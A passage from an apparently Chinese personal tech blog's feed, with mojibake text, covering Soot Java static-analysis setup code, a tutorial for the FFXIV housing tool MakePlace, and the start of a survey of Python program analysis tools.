method</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseStaticInvokeExpr</span><span class="params">(StaticInvokeExpr v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.caseStaticInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseStaticInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke instance method; dispatch based on class</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseVirtualInvokeExpr</span><span class="params">(VirtualInvokeExpr v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.caseVirtualInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseVirtualInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke dynamic method</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseDynamicInvokeExpr</span><span class="params">(DynamicInvokeExpr v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.caseDynamicInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseDynamicInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke interface method</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseInterfaceInvokeExpr</span><span class="params">(InterfaceInvokeExpr v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.defaultCase(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseInterfaceInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">defaultCase</span><span class="params">(Object v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.defaultCase(v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h1><p>æ‰§è¡Œæµï¼ˆPacksï¼‰æ²¡æœ‰ç”¨è¿‡ï¼Œæˆ‘ä¸ªäººçš„ä¸€èˆ¬æ“ä½œæµç¨‹æ˜¯ï¼š</p><ol><li>è®¾ç½® Soot é…ç½®</li><li>è¯»å– .jar</li><li>æ‰§è¡Œåˆ†æ</li></ol><h2 id="Soot-é…ç½®"><a href="#Soot-é…ç½®" class="headerlink" title="Soot é…ç½®"></a>Soot é…ç½®</h2><p>å…¶å®ä¸Šé¢ä¹Ÿæœ‰ï¼Œåœ¨åˆ—ä¸€äº›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">initSootOption</span><span class="params">()</span> &#123;</span><br><span class="line">    G.reset();</span><br><span class="line"></span><br><span class="line">    Options.v().set_prepend_classpath(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_allow_phantom_refs(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_keep_line_number(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    Options.v().set_whole_program(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_verbose(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    Scene.v().loadBasicClasses();</span><br><span class="line">    Scene.v().loadDynamicClasses();</span><br><span class="line">    Scene.v().loadClass(<span class="string">&quot;java.lang.Class&quot;</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Options.v().set_output_format(Options.output_format_jimple);</span></span><br><span class="line"><span class="comment">//        Options.v().set_validate(true);</span></span><br><span class="line"><span class="comment">//        Options.v().set_ignore_classpath_errors(true); // Ignores invalid entries on the Soot classpath.</span></span><br><span class="line"><span class="comment">//        Options.v().set_no_writeout_body_releasing(true); // å½“è¾“å‡ºå†…å®¹åä¸é‡Šæ”¾è·å–çš„bodyæ•°æ®</span></span><br><span class="line"><span class="comment">//        Options.v().set_no_bodies_for_excluded(true);</span></span><br><span class="line"><span class="comment">//        Options.v().set_omit_excepting_unit_edges(true);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Other/">Other</category>
      
      
      <category domain="https://jckling.github.io/tags/Java/">Java</category>
      
      
      <comments>https://jckling.github.io/2022/02/23/Other/Soot%20%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>FF14 MakePlace ä½¿ç”¨æ•™ç¨‹</title>
      <link>https://jckling.github.io/2022/02/09/Game/FFXIV/FF14-MakePlace%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</link>
      <guid>https://jckling.github.io/2022/02/09/Game/FFXIV/FF14-MakePlace%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</guid>
      <pubDate>Wed, 09 Feb 2022 02:15:39 GMT</pubDate>
      
      <description>æœ¬åœ°è£…ä¿®æ¨¡æ‹Ÿå™¨</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰å¤ªä¹…æ²¡ä¸Šæ¸¸æˆ S æˆ¿ç‚¸äº†ï¼Œç°åœ¨ä¹°äº†ä¸ªå…¬å¯“æƒ³è¯•è¯•è£…ä¿®æˆæ‘„å½±æ£šï¼Œé¢„è§ˆäº†åŠå¤©å®¶å…·ï¼Œç„¶åæœç´¢åˆ°ä¸€ä¸ªè£…ä¿®ç¥å™¨ â€”â€” <a href="https://jawslouis.itch.io/makeplace">MakePlace</a>ã€‚è¯¥å·¥å…·å¯ä»¥è®©ä½ åœ¨æœ¬åœ°è¿›è¡Œè£…ä¿®è®¾è®¡ï¼Œå¹¶åŒ…å«å›½é™…æœå®¶å…·ï¼ˆæ”¯æŒè¿‡æ»¤ï¼‰ï¼Œè€Œä¸”æ”¯æŒä¸­æ–‡ï¼Œå¦‚æœæœ‰ä½¿ç”¨ XIVLauncher çš„è¯å¯ä»¥å®‰è£… MakePlace æ’ä»¶ï¼ˆ<a href="https://github.com/jawslouis/MakePlacePlugin">å›½é™…æœ</a> &#x2F; <a href="https://github.com/Bluefissure/MakePlacePlugin">å›½æœ</a>ï¼‰åœ¨æ¸¸æˆå†…è¿›è¡Œå¯¼å…¥ä¸å¯¼å‡ºã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><h2 id="æ‰‹åŠ¨å®‰è£…"><a href="#æ‰‹åŠ¨å®‰è£…" class="headerlink" title="æ‰‹åŠ¨å®‰è£…"></a>æ‰‹åŠ¨å®‰è£…</h2><p>å›½æœå»ºè®®æ‰‹åŠ¨å®‰è£…ï¼Œä¸ç”¨ç¿»å¢™ï¼Œåªæ˜¯éœ€è¦æ‰‹åŠ¨è¿›è¡Œæ›´æ–°ã€‚</p><p><a href="https://jawslouis.itch.io/makeplace">MakePlace å®˜ç½‘</a> æ‹‰åˆ°ç½‘é¡µä¸­é—´å·¦å³æœ‰ä¸ªä¸‹è½½æŒ‰é’®ï¼Œçº¦ 1GB å·¦å³çš„å‹ç¼©åŒ…ï¼Œå®˜ç½‘è®¿é—®å›°éš¾çš„ä¹Ÿå¯ä»¥ä» <a href="https://pan.baidu.com/s/1qIrelIy2zd4b3QU95CkXTw?pwd=zlyp">ç™¾åº¦ç½‘ç›˜</a> ä¸‹è½½ï¼ˆå¯èƒ½ä¸æ˜¯æœ€æ–°çš„ï¼‰ã€‚</p><img src="https://s2.loli.net/2023/09/02/1Wmeh8zQ3Z7PUAD.png" ><p>å»ºè®®è§£å‹åˆ° MakePlace æ–‡ä»¶å¤¹ï¼ˆè‡ªå·±æ–°å»ºï¼‰ï¼ŒåŒå‡» MakePlace.exe å³å¯å¯åŠ¨ç¨‹åºã€‚</p><img src="https://s2.loli.net/2023/09/02/1jJTldwPhnUfDgR.png" ><h2 id="ä½¿ç”¨-itch-å®‰è£…"><a href="#ä½¿ç”¨-itch-å®‰è£…" class="headerlink" title="ä½¿ç”¨ itch å®‰è£…"></a>ä½¿ç”¨ itch å®‰è£…</h2><p>å›½é™…æœå¯ä»¥ç”¨ itch å®‰è£…ï¼ˆéœ€è¦ç¿»å¢™ï¼‰ï¼Œæ”¯æŒè‡ªåŠ¨æ›´æ–°ã€‚</p><p>ä¸‹è½½ <a href="https://itch.io/app">itch app</a> å¹¶æ‰§è¡Œå®‰è£…</p><div class="gallery-container" data-type="data" data-button="">      <div class="gallery-data">[{"url":"https://s2.loli.net/2023/09/02/GiI9qDONZnzMtjx.png","alt":""},{"url":"https://s2.loli.net/2023/09/02/U4A5hIysrgx3MWv.png","alt":""}]</div>      <div class="gallery-items">      </div>    </div><p>å®‰è£…å®Œæ¯•åå¯åŠ¨ itch appï¼Œéœ€è¦ç™»å½• <a href="https://itch.io/">itch</a> è´¦å·</p><div class="gallery-container" data-type="data" data-button="">      <div class="gallery-data">[{"url":"https://s2.loli.net/2023/09/02/y7gs9tmIzV5FWLP.png","alt":""},{"url":"https://s2.loli.net/2023/09/02/tWQdAI9z5aJqHlE.png","alt":""}]</div>      <div class="gallery-items">      </div>    </div><p>ç„¶åä½¿ç”¨æœç´¢æ æœç´¢å¹¶å®‰è£… MakePlace</p><div class="gallery-container" data-type="data" data-button="">      <div class="gallery-data">[{"url":"https://s2.loli.net/2023/09/02/IbZy6RA75SCUmes.jpg","alt":""},{"url":"https://s2.loli.net/2023/09/02/IJQijagtr3ANlnW.jpg","alt":""}]</div>      <div class="gallery-items">      </div>    </div><p>å¯ä»¥åœ¨ <code>èµ„æºåº“</code> ä¸­æŸ¥çœ‹æ‰€æœ‰å·²å®‰è£…çš„ appï¼Œç‚¹å‡» MakePlace è¿è¡Œï¼ˆåœˆå‡ºçš„ä¸¤ä¸ªéƒ½è¡Œï¼‰ï¼Œé¦–æ¬¡è¿è¡Œæ—¶ä¼šå…ˆä¸‹è½½å¿…è¦çš„ä¾èµ–</p><div class="gallery-container" data-type="data" data-button="">      <div class="gallery-data">[{"url":"https://s2.loli.net/2023/09/02/RKdCuy4jUfATre6.jpg","alt":""},{"url":"https://s2.loli.net/2023/09/02/DNG5FAg26wSR8iY.jpg","alt":""}]</div>      <div class="gallery-items">      </div>    </div><p>å³é”® MakePlace å¯ä»¥æ£€æŸ¥æ›´æ–°ï¼ˆåŒæ ·åœˆå‡ºçš„ä¸¤ä¸ªéƒ½è¡Œï¼‰</p><img src="https://s2.loli.net/2023/09/02/J3GQ9l4wOK6BkoT.jpg" ><h1 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h1><p>æ¯æ¬¡æ‰“å¼€éƒ½ä¼šè¿›å…¥é»˜è®¤åœºæ™¯ï¼š</p><img src="https://s2.loli.net/2023/09/02/49nEV36IBK72hpt.jpg" ><h2 id="å³ä¸Šå·¥å…·æ "><a href="#å³ä¸Šå·¥å…·æ " class="headerlink" title="å³ä¸Šå·¥å…·æ "></a>å³ä¸Šå·¥å…·æ </h2><h3 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h3><p>ç‚¹å‡»é½¿è½®å›¾æ ‡ï¼ˆ<code>Settings</code>ï¼‰æ‰“å¼€è®¾ç½®é¢æ¿ï¼Œå¯ä»¥çœ‹åˆ°å³ä¸‹è§’æ˜¾ç¤ºç‰ˆæœ¬ <code>v121</code> ï¼ˆæ¯”å®˜ç½‘æ˜¾ç¤ºçš„ Version 122 å°ï¼Œå¯èƒ½æ˜¯ä»ç‰ˆæœ¬ 0 å¼€å§‹è®¡æ•°ï¼‰ã€‚</p><p>åœ¨å…¶ä»–é€‰é¡¹ï¼ˆ<code>Others</code>ï¼‰ä¸­å°†è¯­è¨€è®¾ç½®ä¸ºä¸­æ–‡ï¼Œé»˜è®¤éšè—å›½é™…æœå®¶å…·</p><img src="https://s2.loli.net/2023/09/02/QKGDJnaHRgte4wB.jpg" ><p>æ§åˆ¶é€‰é¡¹ï¼ˆ<code>Controls</code>ï¼‰ç”¨äºè®¾ç½®å¿«æ·é”®</p><img src="https://s2.loli.net/2023/09/02/k8TQ9dCSANuz4HI.jpg" ><p>ç”»é¢é€‰é¡¹ï¼ˆ<code>Graphics</code>ï¼‰è®¾ç½®ç”»é¢çš„å¤§å°ä¸è´¨é‡ï¼Œç¬¬ä¸€æ¬¡è¿è¡Œæ—¶å¯èƒ½æ˜¯å…¨å±æ¨¡å¼ï¼Œå¯ä»¥æ”¹ä¸ºçª—å£æ¨¡å¼</p><img src="https://s2.loli.net/2023/09/02/PQV2ihljzTc1dg9.jpg" ><h3 id="Layout"><a href="#Layout" class="headerlink" title="Layout"></a>Layout</h3><p>åŠ è½½ä¸ä¿å­˜</p><img src="https://s2.loli.net/2023/09/02/JFg2EV3KtSudpIT.jpg" ><p>MakePlace ä¸­ä¿å­˜ä¸åŠ è½½çš„æ–‡ä»¶ç§°ä¸º Layoutï¼Œå®é™…æ˜¯ json æ–‡ä»¶</p><img src="https://s2.loli.net/2023/09/02/ut8WwISm5gDqlax.png" ><p>åŒå‡»åŠ è½½ç¤ºä¾‹æ–‡ä»¶ <code>Clair de Lune</code></p><img src="https://s2.loli.net/2023/09/02/Xjia2c3hnEJVy4x.jpg" ><h3 id="House-Options"><a href="#House-Options" class="headerlink" title="House Options"></a>House Options</h3><p>æˆ¿å±‹é€‰é¡¹</p><ul><li>æˆ¿å±‹å¤§å°ï¼šå…¬å¯“ã€å°å‹æˆ¿ã€ä¸­å‹æˆ¿ã€å¤§å‹æˆ¿ã€æ— äººå²›ï¼ˆçœŸæœäº†è¿™ç¿»è¯‘ğŸ˜…ï¼‰</li><li>ç…§æ˜è°ƒæ•´ï¼šå®¤å†…ç¯å…‰ã€ç¯å¢ƒå…‰</li></ul><img src="https://s2.loli.net/2023/09/02/OKUa65BymuoF8he.jpg" ><h3 id="Furniture-List"><a href="#Furniture-List" class="headerlink" title="Furniture List"></a>Furniture List</h3><p>æ˜¾ç¤ºå½“å‰å·²å¸ƒç½®çš„å®¶å…·</p><h3 id="Fixture-List"><a href="#Fixture-List" class="headerlink" title="Fixture List"></a>Fixture List</h3><p>æ˜¾ç¤ºå½“å‰è®¾ç½®çš„è£…æ½¢é…ä»¶</p><img src="https://s2.loli.net/2023/09/02/L36akMPWTDfB7vd.jpg" ><h3 id="Go-Outside-x2F-Go-Inside"><a href="#Go-Outside-x2F-Go-Inside" class="headerlink" title="Go Outside &#x2F; Go Inside"></a>Go Outside &#x2F; Go Inside</h3><p>é™¤å…¬å¯“å’Œæ— äººå²›ä¹‹å¤–ï¼Œéƒ½å¯ä»¥è¿›å…¥åº­é™¢ï¼Œæˆ–ä»åº­é™¢è¿›å…¥æˆ¿å±‹ï¼Œåœ¨åº­é™¢å¯ä»¥çœ‹åˆ°é¢å¤–çš„æˆ¿å±‹è®¾ç½®</p><img src="https://s2.loli.net/2023/09/02/gNL6O5b8UEowjRv.jpg" ><h3 id="Online-Houses"><a href="#Online-Houses" class="headerlink" title="Online Houses"></a>Online Houses</h3><p>æŸ¥çœ‹å¤§å®¶åˆ†äº«çš„æˆ¿å±‹è®¾è®¡ï¼Œé€‰ä¸­ä¹‹åå¯ä»¥ç‚¹å‡» <code>Visit</code> è¿›è¡Œå‚è§‚ï¼Œä¹Ÿå¯ä»¥å°†å½“å‰æˆ¿å±‹è®¾è®¡ä¿å­˜åˆ°æœ¬åœ° Layout ä¸­ã€‚</p><img src="https://s2.loli.net/2023/09/02/OEpaADhF2Hdolcy.jpg" ><img src="https://s2.loli.net/2023/09/02/pSAwzUhfC6sa9FX.jpg" ><h3 id="Online-Catalog"><a href="#Online-Catalog" class="headerlink" title="Online Catalog"></a>Online Catalog</h3><p>æŸ¥çœ‹å¤§å®¶åˆ†äº«çš„è®¾è®¡ï¼Œå¯ä»¥ç›´æ¥åŠ è½½åˆ°å½“å‰ Layout ä¸­ï¼Œè€Œä¸ç”¨æ›¿æ¢æ•´ä¸ªæˆ¿å±‹ã€‚</p><img src="https://s2.loli.net/2023/09/02/yoCm2WwUqksj6Ng.jpg" ><h3 id="Rate-Places"><a href="#Rate-Places" class="headerlink" title="Rate Places"></a>Rate Places</h3><p>éšæœºå‚è§‚å¹¶è¿›è¡Œè¯„åˆ†ã€‚</p><img src="https://s2.loli.net/2023/09/02/Avr9GYI5eKzSiuE.jpg" ><h2 id="å·¦ä¸Šå·¥å…·æ "><a href="#å·¦ä¸Šå·¥å…·æ " class="headerlink" title="å·¦ä¸Šå·¥å…·æ "></a>å·¦ä¸Šå·¥å…·æ </h2><h3 id="View-amp-Move-Options"><a href="#View-amp-Move-Options" class="headerlink" title="View &amp; Move Options"></a>View &amp; Move Options</h3><p>é»˜è®¤ç¬¬ä¸€äººç§° + é£è¡Œæ¨¡å¼ï¼Œå¦‚æœåœ¨é«˜å¤„ä»é£è¡Œæ¨¡å¼åˆ‡æ¢ä¸ºè¡Œèµ°æ¨¡å¼ä¼šç›´æ¥è½åˆ°åœ°é¢</p><ul><li>è§†è§’ï¼šç¬¬ä¸€äººç§° &#x2F; ç¬¬ä¸‰äººç§°</li><li>ç§»åŠ¨ï¼šè¡Œèµ°æ¨¡å¼ &#x2F; é£è¡Œæ¨¡å¼</li></ul><img src="https://s2.loli.net/2023/09/02/DimgFKeP7qkTJEa.jpg" ><h3 id="Move-Mode-x2F-Rotation-Mode"><a href="#Move-Mode-x2F-Rotation-Mode" class="headerlink" title="Move Mode &#x2F; Rotation Mode"></a>Move Mode &#x2F; Rotation Mode</h3><p>ç§»åŠ¨è·ç¦»ï¼Œæ‹–åŠ¨å®¶å…·æ—¶ä¼šæŒ‰ç…§è¿™ä¸ªè·ç¦»ç§»åŠ¨</p><img src="https://s2.loli.net/2023/09/02/8RfarOwvSqiMQLH.jpg" /><p>æ—‹è½¬è§’åº¦ï¼Œæ‹–åŠ¨å®¶å…·æ—¶ä¼šæŒ‰ç…§è¿™ä¸ªè§’åº¦æ—‹è½¬</p><img src="https://s2.loli.net/2023/09/02/hfUay1PNTjMI4n3.jpg" /><h3 id="Copy-x2F-Delete"><a href="#Copy-x2F-Delete" class="headerlink" title="Copy &#x2F; Delete"></a>Copy &#x2F; Delete</h3><p>å¤åˆ¶ &#x2F; åˆ é™¤</p><h3 id="Undo-x2F-Redo"><a href="#Undo-x2F-Redo" class="headerlink" title="Undo &#x2F; Redo"></a>Undo &#x2F; Redo</h3><p>æ’¤é”€ &#x2F; é‡åš</p><h2 id="å·¦ä¸‹å·¥å…·æ "><a href="#å·¦ä¸‹å·¥å…·æ " class="headerlink" title="å·¦ä¸‹å·¥å…·æ "></a>å·¦ä¸‹å·¥å…·æ </h2><p>å³ä¸‹è§’æ˜¾ç¤ºä¸€ä¸ªé€‰é¡¹æ¡†ï¼Œå¯ä»¥è¿‡æ»¤ <code>Market Prohibited</code>ï¼ˆç¦æ­¢äº¤æ˜“ï¼‰ å’Œ <code>Cash Shop only</code>ï¼ˆå•†åŸå‡ºå”®ï¼‰</p><img src="https://s2.loli.net/2023/09/02/UWNZCPwkvQrSKMA.jpg" ><h3 id="Fixture"><a href="#Fixture" class="headerlink" title="Fixture"></a>Fixture</h3><p>è£…æ½¢é…ä»¶</p><img src="https://s2.loli.net/2023/09/02/YE8yqvaNgo6rdOm.jpg" ><h3 id="Lighting"><a href="#Lighting" class="headerlink" title="Lighting"></a>Lighting</h3><p>ç…§æ˜</p><img src="https://s2.loli.net/2023/09/02/lhetgmE9cfMKbXa.jpg" ><h3 id="Furniture"><a href="#Furniture" class="headerlink" title="Furniture"></a>Furniture</h3><p>å®¶å…·ï¼ŒåŒ…å«ä»¥ä¸‹åˆ†ç±»</p><ul><li>Cabinet &#x2F; æ©±æŸœ</li><li>Chair &#x2F; æ¤…å­</li><li>Rug &#x2F; åœ°æ¯¯</li><li>Shelf &#x2F; æŸœå­</li><li>Table &#x2F; æ¡Œå­</li><li>Wall-Mounted &#x2F; å£æŒ‚</li><li>Others &#x2F; å…¶ä»–</li></ul><img src="https://s2.loli.net/2023/09/02/m6YujcMaKQkA71w.jpg" ><h3 id="Item"><a href="#Item" class="headerlink" title="Item"></a>Item</h3><p>ç‰©å“ï¼ŒåŒ…å«ä»¥ä¸‹åˆ†ç±»</p><ul><li>Food &#x2F; é£Ÿç‰©</li><li>Printed &#x2F; å£ç”»</li><li>Replica &#x2F; æ¨¡å‹</li><li>Stuffed &#x2F; ç©å¶</li><li>Trophy &#x2F; å¥–æ¯</li><li>Others &#x2F; å…¶ä»–</li></ul><img src="https://s2.loli.net/2023/09/02/ZrkSfyugAhE18PC.jpg" ><h3 id="Greenery"><a href="#Greenery" class="headerlink" title="Greenery"></a>Greenery</h3><p>æ¤ç‰©ï¼ŒåŒ…å«ä»¥ä¸‹åˆ†ç±»</p><ul><li>Potted &#x2F; ç›†æ ½</li><li>Others &#x2F; å…¶ä»–</li></ul><img src="https://s2.loli.net/2023/09/02/zVgZJXihuEea7HM.jpg" ><h3 id="Interative"><a href="#Interative" class="headerlink" title="Interative"></a>Interative</h3><p>äº’åŠ¨å®¶å…·</p><img src="https://s2.loli.net/2023/09/02/Hx2FDoUi4dwAY7W.jpg" width="80%" /><h3 id="Custom-Design"><a href="#Custom-Design" class="headerlink" title="Custom Design"></a>Custom Design</h3><p>è‡ªå®šä¹‰è®¾è®¡</p><img src="https://s2.loli.net/2023/09/02/eqOQYCM3UAb8TPd.jpg" ><h3 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h3><p>æœç´¢</p><img src="https://s2.loli.net/2023/09/02/sRyoOIKrMH4dXui.jpg" ><h1 id="é—®é¢˜ä¸è§£å†³"><a href="#é—®é¢˜ä¸è§£å†³" class="headerlink" title="é—®é¢˜ä¸è§£å†³"></a>é—®é¢˜ä¸è§£å†³</h1><ol><li><p>æ²¡æœ‰éšè—å›½é™…æœå®¶å…·çš„é€‰é¡¹</p><p> è¯·å°†è¯­è¨€è®¾ç½®ä¸ºä¸­æ–‡ï¼Œå¦‚æœè¿˜æ˜¯æ²¡æœ‰å°±é‡å¯ MakePlace</p></li><li><p>æŠ¥é”™ <code>OodleData</code> ç›¸å…³æ’ä»¶æœªå®‰è£…</p><p> æ—§ç‰ˆæœ¬çš„ MakePlace æ²¡æœ‰æ¸…ç†å¹²å‡€ï¼Œå»ºè®®ä½¿ç”¨ <a href="https://www.voidtools.com/zh-cn/">Everything</a> åˆ é™¤æ‰€æœ‰ MakePlace ç›¸å…³æ–‡ä»¶å¤¹åå†é‡æ–°å®‰è£…ã€‚</p></li></ol><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li><a href="https://jawslouis.itch.io/makeplace">MakePlace</a></li><li><a href="https://github.com/itchio/itch">itchio&#x2F;itch</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Game/">Game</category>
      
      
      <category domain="https://jckling.github.io/tags/FFXIV/">FFXIV</category>
      
      
      <comments>https://jckling.github.io/2022/02/09/Game/FFXIV/FF14-MakePlace%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Python ç¨‹åºåˆ†æå·¥å…·è°ƒç ”</title>
      <link>https://jckling.github.io/2021/12/30/Security/Python%20%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/</link>
      <guid>https://jckling.github.io/2021/12/30/Security/Python%20%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/</guid>
      <pubDate>Thu, 30 Dec 2021 08:50:11 GMT</pubDate>
      
      <description>ä¸€äº›å¼€æºå’Œé—­æºå·¥å…·</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="Python-ç¨‹åºåˆ†æå·¥å…·è°ƒç ”"><a href="#Python-ç¨‹åºåˆ†æå·¥å…·è°ƒç ”" class="headerlink" title="Python ç¨‹åºåˆ†æå·¥å…·è°ƒç ”"></a>Python ç¨‹åºåˆ†æå·¥å…·è°ƒç ”</h2><p>Github ä¸Šçš„å¼€æºå·¥å…·ï¼Œ<code>*</code> å·è¡¨ç¤ºä»“åº“å·²ç»ä¸å†ç»´æŠ¤</p><table><thead><tr><th>å·¥å…·</th><th>æè¿°</th><th>å¼€å‘è¯­è¨€</th></tr></thead><tbody><tr><td><a href="https://github.com/yinwang0/pysonar2">PySonar2</a></td><td>è¯­ä¹‰ç´¢å¼•å™¨ï¼Œç”¨äºæ‰¹é‡å¤„ç†å¤§å‹ä»£ç åº“ã€‚ç‰ºç‰²å®æ—¶ç´¢å¼•èƒ½åŠ›ï¼Œä½¿ç”¨è¿‡ç¨‹é—´åˆ†ææ¥æ¨æ–­å˜é‡ã€å‚æ•°å’Œå‡½æ•°çš„ç±»å‹ã€‚ç›®å‰ä½œä¸ºå¤§å‹ä»£ç ç´¢å¼•æœåŠ¡çš„åŸºç¡€å¼•æ“ï¼ŒSourcegraph ä¸­ä¹Ÿæœ‰ä½¿ç”¨è¯¥å·¥å…·ã€‚</td><td>Java</td></tr><tr><td><a href="https://github.com/sourcegraph/sourcegraph">Sourcegraph </a></td><td>ä»£ç æœç´¢å’Œå¯¼èˆªå¼•æ“ï¼Œå¸®åŠ©é˜…è¯»å’Œç†è§£å¤§å‹é¡¹ç›®çš„ä»£ç ã€‚ç›®å‰æ”¯æŒ Goã€Javaã€Python ç­‰å¤šç§ç¼–ç¨‹è¯­è¨€ï¼Œèƒ½å¤Ÿä»¥æµè§ˆå™¨æ’ä»¶çš„å½¢å¼æä¾›åœ¨çº¿ä»£ç é˜…è¯»çš„åŠŸèƒ½ã€‚</td><td>Goã€TypeScript</td></tr><tr><td><a href="https://github.com/coala/coala">coala</a></td><td>ä½¿ç”¨é…ç½®æ–‡ä»¶æ£€æµ‹å’Œä¿®å¤ä»£ç ï¼Œå¯è‡ªå®šä¹‰è§„åˆ™å’Œæ ‡å‡†æ£€æŸ¥ä»£ç è´¨é‡ï¼Œæ‰©å±•æ€§å¼ºã€‚æ”¯æŒ Pythonã€Javaã€C&#x2F;C++ã€JavaScript ç­‰å¤šç§ç¼–ç¨‹è¯­è¨€ï¼Œæ”¯æŒä½œä¸ºç¼–è¾‘å™¨æ’ä»¶ä½¿ç”¨ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/nvdv/vprof">vprof</a></td><td>æ€§èƒ½åˆ†æå·¥å…·ï¼Œä¸º Python ç¨‹åºçš„è¿è¡Œæ—¶é—´ã€å†…å­˜ä½¿ç”¨æƒ…å†µç­‰æä¾›äº¤äº’å¼å¯è§†åŒ–ï¼Œä¸é€‚ç”¨äºå¤§å‹ä»£ç çš„åˆ†æã€‚</td><td>Pythonã€JavaScript</td></tr><tr><td><a href="https://github.com/scottrogowski/code2flow">Code2Flow</a></td><td>ä¸ºåŠ¨æ€è¯­è¨€ç”Ÿæˆç”Ÿæˆè°ƒç”¨å›¾ï¼ˆCall Graphï¼‰ï¼Œç›®å‰æ”¯æŒ Pythonã€JavaScriptã€Rubyã€PHPã€‚åŸºç¡€æµç¨‹ï¼š<code>AST -&gt; å‡½æ•°å®šä¹‰ -&gt; å‡½æ•°è°ƒç”¨ç‚¹ -&gt; è¿æ¥ç‚¹</code> ï¼Œä¸»è¦æ˜¯æä¾›ä¸€ä¸ªç²—ç•¥çš„æ¦‚è§ˆã€‚ç¼ºç‚¹æ˜¯æ²¡æœ‰å®šä¹‰çš„å‡½æ•°ã€ä¸åŒå‘½åç©ºé—´ç›¸åŒåå­—çš„å‡½æ•°å°†è¢«è·³è¿‡ç­‰ï¼Œå› æ­¤å¹¶ä¸é€‚ç”¨äºå¤§å‹ä»£ç çš„åˆ†æã€‚</td><td>Pythonã€JavaScript</td></tr><tr><td><a href="https://github.com/thebjorn/pydeps">pydeps</a></td><td>Python æ¨¡å—ä¾èµ–å¯è§†åŒ–ï¼Œå¯¼å‡º <code>.svg</code> æˆ– <code>.png</code> æ–‡ä»¶ã€‚åªè€ƒè™‘å¯¼å…¥çš„æ–‡ä»¶ï¼ˆæ¨¡å—å¿…é¡»å®‰è£…ï¼‰ï¼Œåœ¨ Python å­—èŠ‚ç ä¸­æŸ¥æ‰¾å¯¼å…¥æ“ä½œç 